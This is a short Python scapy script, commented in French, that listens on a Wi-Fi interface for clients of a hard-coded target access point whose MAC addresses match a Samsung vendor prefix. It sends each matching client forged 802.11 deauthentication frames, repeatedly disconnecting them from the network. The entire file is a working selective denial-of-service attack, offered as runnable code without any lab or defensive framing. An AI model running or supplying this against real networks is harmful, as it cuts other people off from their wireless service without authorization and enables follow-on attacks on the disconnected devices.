#!/usr/bin/env python

from scapy.all import *

import time

interface = "wlan18"  # l'interface Wi-Fi qui sera utilisée pour envoyer les trames

bssid = "00:18:4d:7a:ed:aa"  # le BSSID du point d'accès cible

targetoui = "68:5a:cf" # OUI de Samsung Electronics Co,.Ltd

def selectivedeauth(t):

    if t.haslayer(Dot11):

        #t.display()

        # on vérifie d'abord que l'on a bien affaire à une trame 802.11

        if  t.addr3 == bssid and t.type == 2 and t.addr2 != bssid and t.addr2.startswith(targetoui):

            trame = RadioTap()/Dot11(type=0,subtype=12,addr1=t.addr2,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
        
            sendp(trame,iface=interface)

            print ("Envoie trame deauth a destination de " + t.addr2)


# On lance une capture et pour chaque paquet recu on appelle selectivedeauth

sniff(iface=interface, prn=selectivedeauth)